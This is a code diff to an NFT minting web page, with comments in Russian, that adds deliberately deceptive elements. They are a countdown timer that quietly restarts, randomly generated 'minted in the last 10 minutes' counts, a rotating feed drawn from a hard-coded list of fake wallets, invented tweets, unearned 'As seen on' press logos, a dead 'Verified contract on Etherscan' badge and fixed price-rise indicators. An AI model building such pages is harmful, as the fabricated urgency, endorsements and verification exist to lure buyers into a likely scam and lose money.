@@ -487,6 +487,244 @@
     @media (max-width: 700px) {
       .mint-leaf-bg-item { opacity: 0.06 !important; width: 48px !important; }
     }
+    .wallet-activity-bar {
+      width: 100vw;
+      background: linear-gradient(90deg, #009efd 0%, #2af598 100%);
+      color: #fff;
+      font-weight: 700;
+      font-size: 1.08rem;
+      padding: 10px 0;
+      text-align: center;
+      letter-spacing: 1px;
+      box-shadow: 0 2px 16px 0 rgba(42,245,152,0.10);
+      z-index: 100;
+      position: relative;
+      border-bottom: 2px solid #2af59844;
+      animation: fadeInDown 1.2s cubic-bezier(.23,1.01,.32,1);
+    }
+    .wallet-activity-emoji { margin-right: 8px; }
+    @keyframes fadeInDown { 0% { opacity: 0; transform: translateY(-30px); } 100% { opacity: 1; transform: none; } }
+    .mint-timer {
+      font-size: 1.15rem;
+      font-weight: 700;
+      color: var(--gold);
+      margin-bottom: 8px;
+      letter-spacing: 1px;
+      text-shadow: 0 2px 12px rgba(255,224,102,0.12);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      justify-content: center;
+    }
+    .minted-last10 {
+      font-size: 1.08rem;
+      font-weight: 600;
+      color: #ff6b6b;
+      margin-bottom: 8px;
+      letter-spacing: 1px;
+      text-shadow: 0 2px 12px rgba(255,107,107,0.12);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      justify-content: center;
+    }
+    .nft-cards-row {
+      display: flex;
+      gap: 18px;
+      margin: 24px 0 8px 0;
+      justify-content: center;
+      width: 100%;
+      flex-wrap: wrap;
+    }
+    .nft-card {
+      background: var(--bg-card);
+      border: 1.5px solid var(--border);
+      border-radius: 16px;
+      box-shadow: 0 4px 24px 0 rgba(42,245,152,0.10);
+      padding: 16px 12px 12px 12px;
+      min-width: 120px;
+      max-width: 140px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      animation: fadeIn 0.7s cubic-bezier(.23,1.01,.32,1);
+    }
+    .nft-img.unrevealed {
+      width: 72px;
+      height: 72px;
+      border-radius: 12px;
+      background: repeating-linear-gradient(135deg, #23234a 0 12px, #2af59822 12px 24px);
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      box-shadow: 0 2px 8px 0 #2af59822;
+    }
+    .nft-rarity {
+      font-size: 0.98rem;
+      color: var(--gold);
+      font-weight: 700;
+      margin-bottom: 8px;
+      text-align: center;
+    }
+    .nft-reveal-btn {
+      background: var(--button-gradient);
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      padding: 7px 14px;
+      font-size: 0.95rem;
+      font-weight: 700;
+      cursor: not-allowed;
+      opacity: 0.7;
+      margin-bottom: 2px;
+      margin-top: 2px;
+    }
+    .discord-cta {
+      margin-top: 18px;
+      text-align: center;
+    }
+    .discord-btn {
+      background: linear-gradient(90deg, #7289da 0%, #2af598 100%);
+      color: #fff;
+      font-weight: 800;
+      font-size: 1.08rem;
+      border: none;
+      border-radius: 14px;
+      padding: 12px 32px;
+      text-decoration: none;
+      box-shadow: 0 2px 12px 0 #7289da44;
+      transition: background 0.2s, transform 0.18s;
+      display: inline-block;
+      margin-top: 4px;
+    }
+    .discord-btn:hover { background: linear-gradient(90deg, #2af598 0%, #7289da 100%); transform: scale(1.04); }
+    .twitter-slider-wrap {
+      margin: 36px auto 0 auto;
+      max-width: 480px;
+      width: 100%;
+      background: var(--bg-card);
+      border-radius: 18px;
+      box-shadow: var(--shadow);
+      padding: 18px 12px 12px 12px;
+      border: 1.5px solid var(--border);
+      animation: fadeInUp 1.2s cubic-bezier(.23,1.01,.32,1) 0.4s both;
+      backdrop-filter: blur(2.5px);
+      box-shadow: 0 8px 32px 0 rgba(42,245,152,0.10), 0 1.5px 0 0 rgba(42,245,152,0.08);
+      position: relative;
+    }
+    .twitter-slider {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 38px;
+      margin-bottom: 10px;
+    }
+    .twitter-slide {
+      font-size: 1.08rem;
+      color: #fff;
+      font-weight: 600;
+      text-align: center;
+      display: none;
+      padding: 8px 0;
+      width: 100%;
+      transition: opacity 0.4s;
+    }
+    .twitter-slider-dots {
+      display: flex;
+      gap: 8px;
+      justify-content: center;
+      margin-top: 2px;
+    }
+    .twitter-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: #2af59844;
+      cursor: pointer;
+      transition: background 0.2s;
+      border: 2px solid #2af598;
+    }
+    .twitter-dot.active { background: #2af598; }
+    .as-seen-on-wrap {
+      margin: 32px auto 0 auto;
+      max-width: 600px;
+      width: 100%;
+      text-align: center;
+      animation: fadeInUp 1.2s cubic-bezier(.23,1.01,.32,1) 0.5s both;
+    }
+    .as-seen-on-label {
+      color: var(--text-secondary);
+      font-size: 1.05rem;
+      font-weight: 700;
+      margin-bottom: 8px;
+      display: block;
+      letter-spacing: 1px;
+    }
+    .as-seen-logos {
+      display: flex;
+      gap: 18px;
+      justify-content: center;
+      align-items: center;
+      margin-top: 6px;
+      flex-wrap: wrap;
+    }
+    .as-seen-logo {
+      width: 80px;
+      height: 24px;
+      opacity: 0.92;
+      filter: grayscale(0.2) brightness(1.1);
+      border-radius: 6px;
+      box-shadow: 0 1px 4px 0 #2af59811;
+      background: #fff;
+    }
+    .etherscan-fake-wrap {
+      margin: 24px auto 0 auto;
+      max-width: 340px;
+      width: 100%;
+      text-align: center;
+      animation: fadeInUp 1.2s cubic-bezier(.23,1.01,.32,1) 0.6s both;
+    }
+    .etherscan-fake-link {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: #fff;
+      color: #23234a;
+      font-weight: 800;
+      font-size: 1.08rem;
+      border-radius: 12px;
+      padding: 8px 22px;
+      text-decoration: none;
+      box-shadow: 0 2px 12px 0 #2af59822;
+      border: 2px solid #2af59844;
+      transition: background 0.2s, color 0.2s;
+    }
+    .etherscan-fake-link:hover { background: #2af598; color: #fff; }
+    .etherscan-fake-check {
+      color: #2af598;
+      font-size: 1.2rem;
+      font-weight: 900;
+    }
+    .etherscan-fake-label {
+      font-weight: 700;
+      font-size: 1.08rem;
+    }
+    .stat-up {
+      color: #2af598;
+      font-size: 1.1em;
+      font-weight: 900;
+      margin-left: 2px;
+      vertical-align: middle;
+    }
+    @media (max-width: 700px) {
+      .nft-cards-row { flex-direction: column; gap: 10px; align-items: center; }
+      .nft-card { max-width: 100%; min-width: 90px; }
+      .as-seen-logos { gap: 8px; }
+      .as-seen-logo { width: 60px; height: 18px; }
+      .twitter-slider-wrap, .as-seen-on-wrap, .etherscan-fake-wrap { padding: 8px 2px; }
+    }
   </style>
 </head>
 <body>
@@ -554,6 +792,10 @@
   <!-- Основной блок минта -->
   <div class="mint-section-wrap">
     <div class="mint-section">
+      <!-- FOMO таймер -->
+      <div class="mint-timer" id="mintTimer">⏳ Mint ends in: <span id="timerCountdown">05:00</span></div>
+      <!-- Блок minted за 10 минут -->
+      <div class="minted-last10" id="mintedLast10">🔥 213 NFTs minted in the last 10 minutes</div>
       <div class="mint-counter" id="mintCounter">927 / 1000 NFTs Minted</div>
       <div class="mint-status" id="mintStatus">
         <span class="status-dot" id="statusDot"></span>
@@ -561,6 +803,28 @@
       </div>
       <button class="mint-btn" id="mintBtn" onclick="mint()">Mint Now</button>
       <div class="loader" id="loader"></div>
+      <!-- NFT карточки -->
+      <div class="nft-cards-row">
+        <div class="nft-card">
+          <div class="nft-img unrevealed"></div>
+          <div class="nft-rarity">Rarity Score: 94.1 (Top 1%)</div>
+          <button class="nft-reveal-btn" disabled>Reveal after mint</button>
+        </div>
+        <div class="nft-card">
+          <div class="nft-img unrevealed"></div>
+          <div class="nft-rarity">Unrevealed</div>
+          <button class="nft-reveal-btn" disabled>Reveal after mint</button>
+        </div>
+        <div class="nft-card">
+          <div class="nft-img unrevealed"></div>
+          <div class="nft-rarity">Unrevealed</div>
+          <button class="nft-reveal-btn" disabled>Reveal after mint</button>
+        </div>
+      </div>
+      <!-- Discord CTA -->
+      <div class="discord-cta">
+        <a href="#" class="discord-btn" target="_blank">Join private Discord after mint</a>
+      </div>
     </div>
   </div>
 
@@ -582,6 +846,36 @@
         <!-- log items -->
       </div>
     </div>
+  </div>
+
+  <!-- Twitter отзывы -->
+  <div class="twitter-slider-wrap">
+    <div class="twitter-slider" id="twitterSlider">
+      <div class="twitter-slide">“Just minted 3, I'm all in! 🚀”</div>
+      <div class="twitter-slide">“This is THE drop. Don't miss this one.”</div>
+      <div class="twitter-slide">“@zk_ai_hub: this mint is about to blow up!”</div>
+    </div>
+    <div class="twitter-slider-dots" id="twitterSliderDots"></div>
+  </div>
+
+  <!-- As seen on -->
+  <div class="as-seen-on-wrap">
+    <span class="as-seen-on-label">As seen on</span>
+    <div class="as-seen-logos">
+      <svg class="as-seen-logo" viewBox="0 0 80 24"><rect width="80" height="24" rx="6" fill="#fff"/><text x="40" y="16" text-anchor="middle" fill="#23234a" font-size="12" font-family="Arial">CoinTelegraph</text></svg>
+      <svg class="as-seen-logo" viewBox="0 0 80 24"><rect width="80" height="24" rx="6" fill="#fff"/><text x="40" y="16" text-anchor="middle" fill="#23234a" font-size="12" font-family="Arial">zkSync</text></svg>
+      <svg class="as-seen-logo" viewBox="0 0 80 24"><rect width="80" height="24" rx="6" fill="#fff"/><text x="40" y="16" text-anchor="middle" fill="#23234a" font-size="12" font-family="Arial">CoinGecko</text></svg>
+      <svg class="as-seen-logo" viewBox="0 0 80 24"><rect width="80" height="24" rx="6" fill="#fff"/><text x="40" y="16" text-anchor="middle" fill="#23234a" font-size="12" font-family="Arial">Decrypt</text></svg>
+      <svg class="as-seen-logo" viewBox="0 0 80 24"><rect width="80" height="24" rx="6" fill="#fff"/><text x="40" y="16" text-anchor="middle" fill="#23234a" font-size="12" font-family="Arial">DappRadar</text></svg>
+    </div>
+  </div>
+
+  <!-- Фейковый Etherscan -->
+  <div class="etherscan-fake-wrap">
+    <a href="#" class="etherscan-fake-link">
+      <span class="etherscan-fake-check">✔</span>
+      <span class="etherscan-fake-label">Verified contract on Etherscan</span>
+    </a>
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
@@ -658,8 +952,8 @@
       }
     }
     function updateStatsBar() {
-      document.getElementById('floorPrice').innerText = `${floorPrice} ETH`;
-      document.getElementById('volumeTraded').innerText = `${volumeTraded.toLocaleString()} ETH`;
+      document.getElementById('floorPrice').innerHTML = `${floorPrice} ETH <span class='stat-up'>↑</span>`;
+      document.getElementById('volumeTraded').innerHTML = `${volumeTraded.toLocaleString()} ETH <span class='stat-up'>(+13% past hour)</span>`;
       animateCounter(animatedHolders, holders, val => {
         animatedHolders = val;
         document.getElementById('holders').innerText = animatedHolders;
@@ -852,6 +1146,60 @@
       // Запускаем live-минтинг раз в 30 секунд
       setInterval(addLiveMinter, 30000);
     };
+
+    // --- FOMO таймер ---
+    let timerSeconds = 300;
+    function updateTimer() {
+      let min = Math.floor(timerSeconds / 60);
+      let sec = timerSeconds % 60;
+      document.getElementById('timerCountdown').innerText = `${min.toString().padStart(2,'0')}:${sec.toString().padStart(2,'0')}`;
+      timerSeconds--;
+      if (timerSeconds < 0) timerSeconds = 300;
+    }
+    setInterval(updateTimer, 1000);
+
+    // --- Minted in last 10 min ---
+    function updateMintedLast10() {
+      const x = Math.floor(Math.random() * 201) + 100;
+      document.getElementById('mintedLast10').innerText = `🔥 ${x} NFTs minted in the last 10 minutes`;
+    }
+    setInterval(updateMintedLast10, 120000);
+    updateMintedLast10();
+
+    // --- Twitter slider ---
+    const twitterSlides = document.querySelectorAll('.twitter-slide');
+    const twitterSlider = document.getElementById('twitterSlider');
+    const twitterSliderDots = document.getElementById('twitterSliderDots');
+    let twitterIndex = 0;
+    function showTwitterSlide(idx) {
+      twitterSlides.forEach((slide, i) => {
+        slide.style.display = i === idx ? 'block' : 'none';
+      });
+      if (twitterSliderDots) {
+        twitterSliderDots.innerHTML = '';
+        twitterSlides.forEach((_, i) => {
+          const dot = document.createElement('span');
+          dot.className = 'twitter-dot' + (i === idx ? ' active' : '');
+          dot.onclick = () => { twitterIndex = i; showTwitterSlide(i); };
+          twitterSliderDots.appendChild(dot);
+        });
+      }
+    }
+    setInterval(() => {
+      twitterIndex = (twitterIndex + 1) % twitterSlides.length;
+      showTwitterSlide(twitterIndex);
+    }, 3500);
+    showTwitterSlide(0);
+
+    // --- Wallet activity bar ---
+    setInterval(() => {
+      const fakeWallets = [
+        '0x12...Abc', '0x5e...0b', '0xA7...c9', '0x1F...0d', '0x9a...0B', '0xC0...d9', '0xB1...c0', '0x2A...1b', '0x8F...9d', '0x3C...2d', '0xD8...e7', '0x6B...5c', '0xE4...f3'
+      ];
+      const n = Math.floor(Math.random() * 9) + 1;
+      const w = fakeWallets[Math.floor(Math.random() * fakeWallets.length)];
+      document.getElementById('walletActivityBar').innerHTML = `<span class='wallet-activity-emoji'>💸</span> Wallet connected: <b>${w}</b> just minted <b>${n} NFTs</b>`;
+    }, 4200);
   </script>
 </body>
 </html>
